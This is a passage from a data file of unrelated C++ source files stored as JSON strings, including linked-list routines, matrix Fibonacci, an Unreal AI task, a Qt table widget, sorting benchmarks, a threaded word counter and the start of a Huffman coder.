nullptr)\r\n\t{\r\n\t\tcout << \"\u94fe\u8868\u4e0d\u5b58\u5728\" << endl;\r\n\t\treturn false;\r\n\t}\r\n\tif (head->next == nullptr)\r\n\t{\r\n\t\tcout << \"\u94fe\u8868\u4e3a\u7a7a\uff0c\u6ca1\u6709\u8282\u70b9\" << endl;\r\n\t\treturn false;\r\n\t}\r\n\tLNode* p = head->next;\r\n\thead->next = head->next->next;\r\n\tdelete p;\r\n\r\n\treturn true;\r\n}\r\n//\u5220\u9664\u94fe\u8868\u6700\u540e\u4e00\u4e2a\u7ed3\u70b9\r\nint PopBack(LNode* head)\r\n{\r\n\tif (head == nullptr)\r\n\t{\r\n\t\tcout << \"\u94fe\u8868\u4e0d\u5b58\u5728\" << endl;\r\n\t\treturn false;\r\n\t}\r\n\tLNode* p = head;\r\n\twhile (p->next->next != nullptr)\r\n\t{\r\n\t\tp = p->next;\r\n\t}//\u904d\u5386\uff0c\u627e\u5230\u5012\u6570\u7b2c\u4e8c\u4e2a\u7ed3\u70b9\uff08\u5305\u62ec\u5934\u7ed3\u70b9\uff09\r\n\tdelete p->next;\r\n\tp->next = nullptr;\r\n\r\n\treturn true;\r\n}\r\n//\u6e05\u7a7a\u94fe\u8868\uff0c\u91ca\u653e\u94fe\u8868\u6240\u6709\u7ed3\u70b9\uff0c\u4e0d\u5305\u62ec\u5934\u7ed3\u70b9\r\nvoid ClearList(LNode* head)\r\n{\r\n\tif (head == nullptr)\r\n\t{\r\n\t\tcout << \"\u94fe\u8868\u4e0d\u5b58\u5728\" << endl;\r\n\t\treturn;\r\n\t}\r\n\tLNode* tmp1;\r\n\tLNode* tmp2 = head->next;\r\n\twhile (tmp2 != nullptr)\r\n\t{\r\n\t\ttmp1 = tmp2;\r\n\t\ttmp2 = tmp1->next;\r\n\t\tdelete tmp1;\r\n\t}\r\n\thead->next = nullptr;//\u5982\u679c\u7f3a\u5c11\u8fd9\u884c\u4ee3\u7801\uff0c\u5c31\u4f1a\u7559\u4e0b\u91ce\u6307\u9488\r\n}\r\n//\u67e5\u627e\u5143\u7d20ee\u5728\u94fe\u8868\u4e2d\u7684\u7ed3\u70b9\u5730\u5740\uff0c\u6ca1\u627e\u5230\u8fd4\u56denullptr\uff0c\u627e\u5230\u4e86\u8fd4\u56de\u7ed3\u70b9\u5730\u5740\r\nLNode* LocateElem(const LNode* head, const ElemType& ee)\r\n{\r\n\r\n\tLNode* p = head->next;\r\n\twhile (p != nullptr)\r\n\t{\r\n\t\tif (p->data == ee)\r\n\t\t{\r\n\t\t\treturn p;\r\n\t\t}\r\n\t\tp = p->next;\r\n\t}\r\n\treturn p;\r\n}\r\n//\u83b7\u53d6\u7b2cn\u4e2a\u8282\u70b9\uff0c\u6210\u529f\u8fd4\u56de\u8282\u70b9\u5730\u5740\uff0c\u5931\u8d25\u8fd4\u56denullptr\uff08\u7b2c0\u4e2a\u662f\u5934\u8282\u70b9\uff09\r\nLNode* LocateNode(LNode* head, unsigned int n)\r\n{\r\n\tif (head == nullptr)\r\n\t{\r\n\t\tcout << \"\u94fe\u8868\u4e0d\u5b58\u5728\" << endl;\r\n\t\treturn nullptr;\r\n\t}\r\n\tunsigned int ii = 0;\r\n\tLNode* p = head;\r\n\twhile (p != nullptr && (ii < n))\r\n\t{\r\n\t\tp = p->next;\r\n\t\tii++;\r\n\t}\r\n\tif (p == nullptr)\r\n\t{\r\n\t\tcout << \"\u4f4d\u7f6e\" << n << \"\u4e0d\u5408\u6cd5\uff0c\u8d85\u8fc7\u4e86\u8868\u957f\u3002\" << endl;\r\n\t\treturn nullptr;\r\n\t}\r\n\treturn p;\r\n}\r\n//\u5728\u6307\u5b9a\u7ed3\u70b9\u540e\u63d2\u5165\u5143\u7d20ee\r\nbool InsertNextNode(LNode* p, const ElemType& ee)\r\n{\r\n\tif (p == nullptr)\r\n\t{\r\n\t\tcout << \"\u6307\u5b9a\u7ed3\u70b9\u4e0d\u5b58\u5728\" << endl;\r\n\t\treturn false;\r\n\t}\r\n\tLNode* tmp = new LNode;\r\n\ttmp->data = ee;\r\n\ttmp->next = p->next;\r\n\tp->next = tmp;\r\n\r\n\treturn true;\r\n}\r\n//\u5728\u6307\u5b9a\u7ed3\u70b9\u4e4b\u524d\u63d2\u5165\u5143\u7d20ee\r\nbool InsertPriorNode(LNode* p, const ElemType& ee)\r\n{\r\n\tif (p == nullptr)\r\n\t{\r\n\t\tcout << \"\u6307\u5b9a\u7ed3\u70b9\u4e0d\u5b58\u5728\" << endl;\r\n\t\treturn false;\r\n\t}\r\n\t// \u5728\u6307\u5b9a\u7ed3\u70b9p\u4e4b\u524d\u63d2\u5165\u91c7\u7528\u5077\u6881\u6362\u67f1\u7684\u65b9\u6cd5\r\n\t// 1\u3001\u5206\u914d\u4e00\u4e2a\u65b0\u7684\u7ed3\u70b9;\r\n\tLNode* tmp = new LNode;\r\n\t// 2\u3001\u628app\u7ed3\u70b9\u7684\u6570\u636e\u548c\u6307\u9488\u590d\u5236\u5230\u65b0\u7ed3\u70b9\u4e2d\r\n\ttmp->data = p->data;\r\n\ttmp->next = p->next;\r\n\t// 3\u3001\u628a\u5f85\u63d2\u5165\u5143\u7d20\u7684\u6570\u636e\u5b58\u5165p\u7ed3\u70b9\u4e2d\u3002\r\n\tp->data = ee;\r\n\tp->next = tmp;\r\n\r\n\treturn true;\r\n}\r\n//\u5220\u9664\u6307\u5b9a\u7ed3\u70b9\r\nbool DeleteNode(LNode* p)\r\n{\r\n\tif (p == nullptr)\r\n\t{\r\n\t\tcout << \"\u6307\u5b9a\u7ed3\u70b9\u4e0d\u5b58\u5728\" << endl;\r\n\t\treturn false;\r\n\t}\r\n\tif (p->next != nullptr)//\u5982\u679cp\u540e\u9762\u8fd8\u6709\u7ed3\u70b9\r\n\t{\r\n\t\t// \u5220\u9664\u6307\u5b9a\u7ed3\u70b9\u7684\u601d\u60f3\u662f: \r\n\t\t// 1) \u628ap\u540e\u7ee7\u7ed3\u70b9\u7684\u6570\u636e\u548cnext\u6307\u9488\u590d\u5236\u5230p\u7ed3\u70b9;\r\n\t\tLNode* tmp = p->next;\r\n\t\tp->data = tmp->data;\r\n\t\tp->next = tmp->next;\r\n\t\t// 2) \u5220\u9664p\u7ed3\u70b9\u7684\u540e\u7ee7\u7ed3\u70b9\u3002\r\n\t\tdelete tmp;\r\n\t}\r\n\telse\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n}\r\n//\u94fe\u8868\u7684\u6392\u5e8f\r\n/*\u5982\u679c\u94fe\u8868\u4e3a\u7a7a\uff0c\u4e0d\u9700\u8981\u6392\u5e8f\u3002\r\n\t\u5982\u679c\u94fe\u8868\u53ea\u6709\u4e00\u4e2a\u7ed3\u70b9\uff0c\u4e0d\u9700\u8981\u6392\u5e8f\u3002\r\n\t\u5148\u5c06\u7b2c\u4e00\u4e2a\u7ed3\u70b9\u4e0e\u540e\u9762\u6240\u6709\u7684\u7ed3\u70b9\u4f9d\u6b21\u5bf9\u6bd4\u6570\u636e\u57df\uff0c\u53ea\u8981\u6709\u6bd4\u7b2c\u4e00\u4e2a\u7ed3\u70b9\u6570\u636e\u57df\u5c0f\u7684\uff0c\u5219\u4ea4\u6362\u4f4d\u7f6e\u3002\r\n\t\u4ea4\u6362\u4e4b\u540e\uff0c\u62ff\u65b0\u7684\u7b2c\u4e00\u4e2a\u7ed3\u70b9\u7684\u6570\u636e\u57df\u4e0e\u4e0b\u4e00\u4e2a\u7ed3\u70b9\u518d\u6b21\u5bf9\u6bd4\uff0c\u5982\u679c\u6bd4\u4ed6\u5c0f\uff0c\u518d\u6b21\u4ea4\u6362\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002\r\n\t\u7b2c\u4e00\u4e2a\u7ed3\u70b9\u786e\u5b9a\u5b8c\u6bd5\u4e4b\u540e\uff0c\u63a5\u4e0b\u6765\u518d\u5c06\u7b2c\u4e8c\u4e2a\u7ed3\u70b9\u4e0e\u540e\u9762\u6240\u6709\u7684\u7ed3\u70b9\u5bf9\u6bd4\uff0c\u76f4\u5230\u6700\u540e\u4e00\u4e2a\u7ed3\u70b9\u4e5f\u5bf9\u6bd4\u5b8c\u6bd5\u4e3a\u6b62*/\r\n\t//\u5192\u6ce1\u6392\u5e8f\uff08\u6570\u636e\u57df\u4ea4\u6362\uff09\r\nvoid OrderList(LNode* head)\r\n{\r\n\tif (head == nullptr)\r\n\t{\r\n\t\tcout << \"\u94fe\u8868\u4e0d\u5b58\u5728\uff0c\u4e0d\u9700\u8981\u6392\u5e8f\" << endl;\r\n\t\treturn;\r\n\t}\r\n\tif (head->next == nullptr)\r\n\t{\r\n\t\tcout << \"\u94fe\u8868\u53ea\u6709\u4e00\u4e2a\u7ed3\u70b9\uff0c\u4e0d\u9700\u8981\u6392\u5e8f\" << endl;\r\n\t\treturn;\r\n\t}\r\n\tint i = 0, j = 0;\r\n\tLNode* po = head;\r\n\tLNode* p, * p1;\r\n\tsize_t length = ListLength(head);\r\n\tfor (i = 0; i < length - 1; i+",
    "#include <iostream>\n\nusing namespace std;\n\nconst int DIV = 1000000007;\n\nstruct mat2x2\n{\n    long long a;\n    long long b;\n    long long c;\n    long long d;\n};\n\nmat2x2 mat_power(mat2x2 &a, long long b);\nmat2x2 mat_mul(mat2x2 &a, mat2x2 &b);\n\nint main()\n{\n    long long n = 0;\n    cin >> n;\n    mat2x2 mat = {1, 1, 1, 0};\n    if (n <= 1)\n        cout << n;\n    else\n        cout << mat_power(mat, n - 1).a;\n    return 0;\n}\n\nmat2x2 mat_power(mat2x2 &a, long long b)\n{\n    if (b == 1)\n        return a;\n    if (b % 2 == 0)\n    {\n        mat2x2 temp = mat_power(a, b / 2);\n        temp = mat_mul(temp, temp);\n        return temp;\n    }\n    else\n    {\n        mat2x2 temp = mat_power(a, b / 2);\n        temp = mat_mul(temp, temp);\n        temp = mat_mul(temp, a);\n        return temp;\n    }\n}\n\nmat2x2 mat_mul(mat2x2 &a, mat2x2 &b)\n{\n    return {\n        ((a.a * b.a) % DIV + (a.b * b.c) % DIV) % DIV, ((a.a * b.b) % DIV + (a.b * b.d) % DIV) % DIV,\n        ((a.c * b.a) % DIV + (a.d * b.c) % DIV) % DIV, ((a.c * b.b) % DIV + (a.d * b.d) % DIV) % DIV};\n}\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"AI/BTTask_TraceLocation.h\"\n#include \"AIController.h\"\n#include \"BehaviorTree/BlackboardComponent.h\"\n#include \"Navigation/PathFollowingComponent.h\"\n#include \"Monster/GHNormalMonster.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"Anim/GHZombieAnim.h\"\n\nUBTTask_TraceLocation::UBTTask_TraceLocation()\n{\n    bCreateNodeInstance = true;\t// instance\n    bNotifyTick = true;\t\t\t// ticktask \u00c8\u00a3\u00c3\u00e2\n\n    // Trace Speed\n    ChangeWalkSpeed = 300.f;\n\n}\n\nEBTNodeResult::Type UBTTask_TraceLocation::ExecuteTask(UBehaviorTreeComponent& OwnerComp, uint8* NodeMemory)\n{\n    Super::ExecuteTask(OwnerComp, NodeMemory);\n\n    AIController = OwnerComp.GetAIOwner();\n    if(nullptr == AIController) return EBTNodeResult::Failed;\n    BBComp = OwnerComp.GetBlackboardComponent();\n    if(nullptr == BBComp) return EBTNodeResult::Failed;\n    AGHNormalMonster* NormalMonster = Cast<AGHNormalMonster>(AIController->GetPawn());\n    if(nullptr == NormalMonster) return EBTNodeResult::Failed;\n    MoveComp = NormalMonster->GetCharacterMovement();\n    if(nullptr == MoveComp) return EBTNodeResult::Failed;\n    ZombieAnim = Cast<UGHZombieAnim>(NormalMonster->GetMesh()->GetAnimInstance());\n    if(nullptr == ZombieAnim) return EBTNodeResult::Failed;\n\n    // Check Sight\n    if (true == BBComp->GetValueAsBool(FName(\"bOnSight\")))\n    {\n        return EBTNodeResult::Failed;\n    }\n\n    // Play Trace Montage\n    bool Result = ZombieAnim->PlayTraceMontage();\n    if (false == Result)\n    {\n        return EBTNodeResult::Failed;\n    }\n\n    // Move Logic\n    FVector LastLocation = BBComp->GetValueAsVector(FName(\"TargetLastLocation\"));\n    EPathFollowingRequestResult::Type MoveResult = AIController->MoveToLocation(LastLocation);\n    //if (EPathFollowingRequestResult::Failed == MoveResult)\n    //{\n    //    return EBTNodeResult::Failed;\n    //}\n\n    // Set MaxWalk Speed\n    OriginWalkSpeed = MoveComp->MaxWalkSpeed;\n    MoveComp->MaxWalkSpeed = ChangeWalkSpeed;\n\n    // Set Monster State\n    BBComp->SetValueAsEnum(FName(\"EMonsterState\"), static_cast<uint8>(EMonsterState::TRACE));\n\n    return EBTNodeResult::InProgress;\n}\n\nvoid UBTTask_TraceLocation::TickTask(UBehaviorTreeComponent& OwnerComp, uint8* NodeMemory, float DeltaSeconds)\n{\n    Super::TickTask(OwnerComp, NodeMemory, DeltaSeconds);\n\n    // Complete -> Succeeded\n    EPathFollowingStatus::Type MoveStatus = AIController->GetMoveStatus();\n    if (EPathFollowingStatus::Idle == MoveStatus)\n    {\n        AIController->StopMovement();\n\n        // Reset State\n        BBComp->SetValueAsBool(FName(\"bOnTargetLastLocation\"), false);\n        BBComp->SetValueAsEnum(FName(\"EMonsterState\"), static_cast<uint8>(EMonsterState::NONE));\n        MoveComp->MaxWalkSpeed = OriginWalkSpeed;\n        ZombieAnim->StopTraceMontage();\n\n        FinishLatentTask(OwnerComp, EBTNodeResult::Succeeded);\n        return;\n    }\n}\n\nEBTNodeResult::Type UBTTask_TraceLocation::AbortTask(UBehaviorTreeComponent& OwnerComp, uint8* NodeMemory)\n{\n    Super::AbortTask(OwnerComp, NodeMemory);\n\n    AIController->StopMovement();\n\n    // Reset State\n    BBComp->SetValueAsBool(FName(\"bOnTargetLastLocation\"), false);\n    BBComp->SetValueAsEnum(FName(\"EMonsterState\"), static_cast<uint8>(EMonsterState::NONE));\n    MoveComp->MaxWalkSpeed = OriginWalkSpeed;\n    ZombieAnim->StopTraceMontage();\n\n\treturn EBTNodeResult::Type();\n}\n",
    "#include <iostream>\r\n#include <cstring>\r\n#include <windows.h>\r\n#include <vector>\r\n#include <time.h>\r\n\r\nstruct time_r{\r\n\tint h ;\r\n\tint m ;\r\n\tint s ; \r\n\tstd::string filename ;\r\n\ttime_r(int hh, int mm, int ss, std::string str) :\r\n\t\th(hh), m(mm), s(ss), filename(str) {}\r\n};\r\nstd::vector <time_r> table ;\r\n\r\nint main(int argc, char **argv) {\r\n\tif ( argc != 2 ) {\r\n\t\tprintf(\"\\\r\ntime_table [filename]\\n\\\r\ncontact dandinking@buaa.edu.cn for support.\\\r\n\") ;\r\n \t\treturn 0 ;\r\n\t}\r\n\tstd::string com ;\r\n\tfreopen(argv[1], \"r\", stdin) ;\r\n\tint th, tm, ts ;\r\n\twhile(~scanf(\"%d:%d:%d\", &th, &tm, &ts)) {\r\n\t\tstd::cin >> com ;\r\n\t\ttable.push_back(time_r(th, tm, ts, com)) ;\r\n\t}\r\n\tfclose(stdin) ;\r\n\ttime_t rawtime;  \r\n\tstruct tm * timeinfo;\r\n\twhile(1) {  \r\n\t    time(&rawtime);  \r\n\t    timeinfo = localtime(&rawtime);  \r\n\t    for(int i = 0; i < table.size(); i ++) {\r\n\t\t    \tif(\r\n\t\t\t(timeinfo->tm_hour == table[i].h) &&\r\n\t        (timeinfo->tm_min  == table[i].m) &&\r\n\t        (timeinfo->tm_sec  == table[i].s)) {\r\n\t        \tstd::string command = \"cupa \" ;\r\n\t        \tcommand += table[i].filename ;\r\n\t        \tsystem(command.c_str()) ;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\treturn 0 ;\r\n}\r\n",
    "#include \"mainwidget.h\"\n\nMainWidget::MainWidget(QWidget *parent)\n    : QWidget{parent}\n{\n    initializeWidget();\n}\n\nvoid MainWidget::initializeWidget()\n{\n    stolbLE_ = new QLineEdit(\"45\", this);\n    strLE_ = new QLineEdit(\"45\", this);\n    XbLE_ = new QLineEdit(\"5\", this);\n    YbLE_ = new QLineEdit(\"3\", this);\n    XsLE_ = new QLineEdit(\"3\", this);\n    YsLE_ = new QLineEdit(\"1\", this);\n\n    connect(stolbLE_, SIGNAL(editingFinished()), this, SLOT(checkVariables()));\n    connect(strLE_, SIGNAL(editingFinished()), this, SLOT(checkVariables()));\n    connect(stolbLE_, SIGNAL(editingFinished()), this, SLOT(resetTableSize()));\n    connect(strLE_, SIGNAL(editingFinished()), this, SLOT(resetTableSize()));\n    connect(XbLE_, SIGNAL(editingFinished()), this, SLOT(checkVariables()));\n    connect(YbLE_, SIGNAL(editingFinished()), this, SLOT(checkVariables()));\n    connect(XsLE_, SIGNAL(editingFinished()), this, SLOT(checkVariables()));\n    connect(YsLE_, SIGNAL(editingFinished()), this, SLOT(checkVariables()));\n\n    stolbLE_->setMaximumWidth(50);\n    strLE_->setMaximumWidth(50);\n\n    XbLE_->setMaximumWidth(50);\n    YbLE_->setMaximumWidth(50);\n\n    XsLE_->setMaximumWidth(50);\n    YsLE_->setMaximumWidth(50);\n\n    filePathLE_ = new QLineEdit(\"~/\", this);\n    porogTE_ = new QTextEdit(this);\n\n    porogTE_->setReadOnly(true);\n    // porogTE_->setFixedWidth(200);\n\n    hBoxMain_ = new QHBoxLayout(this);\n    vBox1_ = new QVBoxLayout(this);\n    vBox2_ = new QVBoxLayout(this);\n    hBox1_ = new QHBoxLayout(this);\n    hBox2_ = new QHBoxLayout(this);\n\n    formLayout1_ = new QFormLayout(this);\n    formLayout1_->addRow(tr(\"\u041a\u043e\u043b-\u0432\u043e \u0441\u0442\u043e\u043b\u0431\u0446\u043e\u0432:\"), stolbLE_);\n    formLayout1_->addRow(tr(\"\u041a\u043e\u043b-\u0432\u043e \u0441\u0442\u0440\u043e\u043a:\"), strLE_);\n\n    formLayout2_ = new QFormLayout(this);\n    formLayout2_->addRow(tr(\"Xb:\"), XbLE_);\n    formLayout2_->addRow(tr(\"Yb:\"), YbLE_);\n\n    formLayout3_ = new QFormLayout(this);\n    formLayout3_->addRow(tr(\"Xs:\"), XsLE_);\n    formLayout3_->addRow(tr(\"Ys:\"), YsLE_);\n\n    formLayout4_ = new QFormLayout(this);\n    formLayout4_->addRow(tr(\"\u041f\u0443\u0442\u044c \u043a \u0444\u0430\u0439\u043b\u0443:\"), filePathLE_);\n\n    formLayout5_ = new QFormLayout(this);\n    formLayout5_->addRow(tr(\"\u041f\u0440\u0435\u0432\u044b\u0448\u0435\u043d\u0438\u044f \u043f\u043e\u0440\u043e\u0433\u0430:\"), porogTE_);\n\n    loadButton_ = new QPushButton(\"\u0417\u0430\u0433\u0440\u0443\u0437\u0438\u0442\u044c \u0444\u0430\u0439\u043b\", this);\n    connect(loadButton_, SIGNAL(pressed()), this, SLOT(loadFile()));\n\n    tableWidget_ = new QTableWidget(this);\n    tableWidget_->setRowCount(strLE_->text().toInt());\n    tableWidget_->setColumnCount(stolbLE_->text().toInt());\n    // tableWidget_->setEnabled(false);\n\n    for(int i = 0; i < stolbLE_->text().toInt(); i++) {\n        tableWidget_->setColumnWidth(i, 75);\n    }\n\n    QPixmap pix(\":/icons/check.png\");\n\n    btn1_ = new QPushButton(\"\", this);\n    btn2_ = new QPushButton(\"\", this);\n    btn3_ = new QPushButton(\"\", this);\n\n    btn1_->setFlat(true);\n    btn2_->setFlat(true);\n    btn3_->setFlat(true);\n\n    btn1_->setEnabled(false);\n    btn2_->setEnabled(false);\n    btn3_->setEnabled(false);\n\n    btn1_->setToolTip(\"\u041a\u043e\u043b-\u0432\u043e \u0441\u0442\u043e\u043b\u0431\u0446\u043e\u0432 \u0438 \u0441\u0442\u0440\u043e\u043a \u0434\u043e\u043b\u0436\u043d\u043e \u0431\u044b\u0442\u044c > 40\");\n    btn2_->setToolTip(\"Xb < \u043a\u043e\u043b-\u0432\u0430 \u0441\u0442\u043e\u043b\u0431\u0446\u043e\u0432, Xb > Xs, Xb - \u043d\u0435\u0447\u0435\u0442\u043d\u043e\u0435\\nYb < \u043a\u043e\u043b-\u0432\u0430 \u0441\u0442\u0440\u043e\u043a, Yb > Ys, Yb - \u043d\u0435\u0447\u0435\u0442\u043d\u043e\u0435\");\n    btn3_->setToolTip(\"Xs < \u043a\u043e\u043b-\u0432\u0430 \u0441\u0442\u043e\u043b\u0431\u0446\u043e\u0432, Xb > Xs, Xs - \u043d\u0435\u0447\u0435\u0442\u043d\u043e\u0435\\nYs < \u043a\u043e\u043b-\u0432\u0430 \u0441\u0442\u0440\u043e\u043a, Yb > Ys, Ys - \u043d\u0435\u0447\u0435\u0442\u043d\u043e\u0435\");\n\n    btn1_->setIcon(QIcon(pix));\n    btn1_->setIconSize(QSize(50, 50));\n\n    btn2_->setIcon(QIcon(pix));\n    btn2_->setIconSize(QSize(50, 50));\n\n    btn3_->setIcon(QIcon(pix));\n    btn3_->setIconSize(QSize(50, 50));\n\n    calcBtn_ = new QPushButton(\"\u0420\u0430\u0441\u0441\u0447\u0438\u0442\u0430\u0442\u044c\", this);\n    calcBtn_->setEnabled(false);\n    connect(calcBtn_, SIGNAL(pressed()), this, SLOT(calculate()));\n\n    hBox1_->addWidget(btn1_);\n    hBox1_->addLayout(formLayout1_);\n    hBox1_->addWidget(btn2_);\n    hBox1_->addLayout(formLayout2_);\n    hBox1_->addWidget(btn3_);\n    hBox1_->addLayout(formLayout3_);\n\n    hBox2_->addLayout(formLayout4_);\n    hBox2_->addWidget(loadButton_);\n\n    vBox1_->addLayout(hBox1_);\n    vBox1_->addLayout(hBox2_);\n    vBox1_->addWidget(tableWidget_);\n    vBox1_->addWidget(calcBtn_);\n\n    vBox2_->addLayout(formLayout5_);\n\n    hBoxMain_->addLayout(vBox1_);\n    hBoxMain_->addLayout(vBox2_);\n\n    this->setLayout(hBoxMain_);\n}\n\nvoid MainWidget::checkVariables()\n{\n    // loadButton_->setEnabled(false);\n\n    int x = stolbLE_->text().toInt();\n    int y = strLE_->text().toInt();\n    int xb = XbLE_->text().toInt();\n    int yb = YbLE_->text().toInt();\n    int xs = XsLE_->text().toInt();\n    int ys = YsLE_->text().toInt();\n\n    bool xyFine = false;\n    bool bFine = false;\n    bool sFine = false;\n\n    if(x < 41 || y < 41) {\n        btn1_->setIcon(QIcon(QPixmap(\":/icons/cross.png\")));\n        loadButton_->setEnabled(false);\n    } else {\n        btn1_->setIcon(QIcon(QPixmap(\":/icons/check.png\")));\n        loadButton_->setEnabled(true);\n        xyFine = true;\n    }\n\n    if(xb < x && xb > xs && yb < y && yb > ys && (xb%2) && (yb%2)) {\n        btn2_->setIcon(QIcon(QPixmap(\":/icons/check.png\")));\n        bFine = true;\n    } else {\n        btn2_->setIcon(QIcon(QPixmap(\"",
    "\ufeff#include <iostream>\n#include <vector>\n#include \"2)CustomQSort.cpp\"\n\nstd::vector <double> generate_unique_doubles(double min, double max, size_t num_values);\nvoid measure_std_sort_time(std::vector<std::vector<double>>& values, std::vector<int> number_of_values);\nstd::vector<long long> measure_custom_qsort_time(std::vector<std::vector<double>>& values, std::vector<int> number_of_values);\nvoid measure_std_qsort_time(std::vector<std::vector<double>>& values, std::vector<int> number_of_values);\nvoid measure_parallel_sort_time(std::vector<std::vector<double>>& values, std::vector<int> number_of_values);\n\nint main()\n{\n\t// Define the range and the number of unique values\n\tdouble min = 1.0;\n\tdouble max = 10.0;\n\tstd::vector<int> number_of_values{ 2, 10, 1000, 1000000 };\n\tstd::vector<std::vector<double>> values;\n\tsize_t num_values = 10000;\n\n\tfor (int i = 0; i <= number_of_values.size() - 1; i++)\n\t{\n\t\tstd::vector<double> unique_values = generate_unique_doubles(min, max, number_of_values[i]);\n\t\tvalues.push_back(unique_values);\n\t}\n\n\tmeasure_std_qsort_time(values, number_of_values);\n\tmeasure_custom_qsort_time(values, number_of_values);\n\tmeasure_parallel_sort_time(values, number_of_values);\n\n\tfor (int i = 0; i <= number_of_values.size() - 1; i++)\n\t{\n\t\tstd::sort(values[i].begin(), values[i].end());\n\t}\n\n\tmeasure_std_qsort_time(values, number_of_values);\n\tmeasure_custom_qsort_time(values, number_of_values);\n\tmeasure_parallel_sort_time(values, number_of_values);\n\n\n\t//1)Generate unique values \u200b\u200bof double format\n\t//generate_unique_doubles(min, max, num_values);\n\n\t//2)Sort the values and print them\n\t//std::vector<double> unique_values = generate_unique_doubles(min, max, num_values);\n\t//sort_and_print_doubles(unique_values.begin(), unique_values.end());\n\n\t//3)Measure std qsort time\n\t//measure_std_qsort_time(unique_values);\n\n\t//4)Compare std qsort time\n\t//measure_std_sort_time(values, number_of_values);\n\n\t//5)Measure custom qsort time\n\t//measure_custom_qsort_time(unique_values);\n\n\t//6)Sorting in 8-thread mode (IntelCore i7-6700HQ)\n\t//parallel_qsort(unique_values.begin(), unique_values.end());\n\n\t//7)Printing in 8-thread qsort mode \n\t//sort_and_print_doubles_parallel(unique_values.begin(), unique_values.end());\n\n\t//8) Measure 8-thread qsort time\n\t//measure_parallel_sort_time(unique_values);\n\n\treturn 0;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <shared_mutex>\n#include <future>\n#include <cctype>\n#include <unordered_map>\n#include <filesystem>\n#include <exception>\n#include <mutex>\n#include <regex>\n\n// Global shared mutex for thread-safe access to wordCounts\nstd::shared_mutex mutex;\n// Global unordered map to store word counts\nstd::unordered_map<std::string, int> wordCounts;\n\n// Function to convert a string to lowercase\nvoid toLowerCase(std::string &str)\n{\n    std::transform(str.begin(), str.end(), str.begin(), ::tolower);\n}\n\n// Function to add a word to the wordCounts map in a thread-safe manner\nvoid addWord(const std::string &word)\n{\n    std::unique_lock<std::shared_mutex> lock(mutex);\n    wordCounts[word]++;\n}\n\n// Function to process a file and count the words\nvoid mapFile(const std::string &filename)\n{\n    try\n    {\n        // Check if the file exists\n        if (!std::filesystem::exists(filename))\n        {\n            std::cerr << \"File does not exist: \" << filename << std::endl;\n            return;\n        }\n\n        // Open the file\n        std::ifstream file(filename);\n        if (!file.is_open())\n        {\n            std::cerr << \"Cannot open file: \" << filename << std::endl;\n            return;\n        }\n\n        std::string line;\n        // Regex to match words\n        std::regex wordRegex(R\"(\\w+|[^\\w\\s])\");\n        // Read the file line by line\n        while (std::getline(file, line))\n        {\n            // Find all words in the line\n            auto words_begin = std::sregex_iterator(line.begin(), line.end(), wordRegex);\n            auto words_end = std::sregex_iterator();\n\n            // Process each word\n            for (std::sregex_iterator i = words_begin; i != words_end; ++i)\n            {\n                std::string word = (*i).str();\n                toLowerCase(word); // Convert word to lowercase\n                if (!word.empty())\n                {\n                    addWord(word); // Add word to the map\n                }\n            }\n        }\n        file.close(); // Close the file\n    }\n    catch (const std::exception &e)\n    {\n        std::cerr << \"Exception in thread processing file \" << filename << \": \" << e.what() << std::endl;\n    }\n}\n\n// Function to reduce the word counts and print them\nvoid reduce()\n{\n    std::shared_lock<std::shared_mutex> lock(mutex);\n    // Copy wordCounts to a vector and sort it\n    std::vector<std::pair<std::string, int>> sortedWordCounts(wordCounts.begin(), wordCounts.end());\n    std::sort(sortedWordCounts.begin(), sortedWordCounts.end());\n\n    // Print the word counts\n    std::cout << \"Word counts:\\n\";\n    for (const auto &entry : sortedWordCounts)\n    {\n        std::cout << entry.first << \": \" << entry.second << std::endl;\n    }\n}\n\nint main(int argc, char *argv[])\n{\n    // Check if at least one file is provided\n    if (argc < 2)\n    {\n        std::cerr << \"Usage: \" << argv[0] << \" <file1> <file2> ... <fileN>\\n\";\n        return 1;\n    }\n\n    int numFiles = argc - 1;\n    std::vector<std::future<void>> futures;\n\n    // Launch a thread for each file to process it\n    for (int i = 0; i < numFiles; ++i)\n    {\n        futures.emplace_back(std::async(std::launch::async, mapFile, argv[i + 1]));\n    }\n\n    // Wait for all threads to finish\n    for (auto &f : futures)\n    {\n        try\n        {\n            f.get();\n        }\n        catch (const std::exception &e)\n        {\n            std::cerr << \"Exception while waiting for future: \" << e.what() << std::endl;\n        }\n    }\n\n    // Reduce the word counts and print them\n    reduce();\n\n    return 0;\n}",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\n\r\n// A Huffman tree node\r\nstruct Node {\r\n    char data;\r\n    int freq;\r\n    Node* left;\r\n    Node* right;\r\n\r\n    Node(char data, int freq) {\r\n        this->data = data;\r\n        this->freq = freq;\r\n        left = right = nullptr;\r\n    }\r\n};\r\n\r\n// Comparator for the priority queue (min-heap)\r\nstruct CompareNodes {\r\n    bool operator()(Node* const &n1, Node* const &n2) {\r\n        return n1->freq > n2->freq;\r\n    }\r\n};\r\n\r\n// Utility function to print Huffman codes from the Huffman tree\r\nvoid printCodes(Node* root, string code, unordered_map<char, string> huffmanCodes) {\r\n    if (root == nullptr)\r\n        return;\r\n\r\n    // Found a leaf node\r\n    if (!root->left && !root->right) {\r\n        huffmanCodes[root->data] = code;\r\n        cout << root->data << \" : \" << code << endl;\r\n    }\r\n\r\n    // Traverse left and append '0'\r\n    printCodes(root->left, code + \"0\", huffmanCodes);\r\n    \r\n    // Traverse right and append '1'\r\n    printCodes(root->right, code + \"1\", huffmanCodes);\r\n}\r\n\r\n// Build Huffman tree and generate Huffman codes\r\nstring buildHuffmanTree(string text, unordered_map<char, string> huffmanCodes) {\r\n    // Step 1: Calculate frequency of each character\r\n    unordered_map<char, int> freq;\r\n    for (char c : text) {\r\n        freq[c]++;\r\n    }\r\n\r\n    // Step 2: Create a priority queue to store nodes (min-heap)\r\n    priority_queue<Node*, vector<Node*>, CompareNodes> pq;\r\n\r\n    // Step 3: Create a leaf node for each character and add it to the priority queue\r\n    for (auto pair : freq) {\r\n        pq.push(new Node(pair.first, pair.second));\r\n    }\r\n\r\n    // Step 4: Build the Huffman tree by extracting two minimum frequency nodes\r\n    // 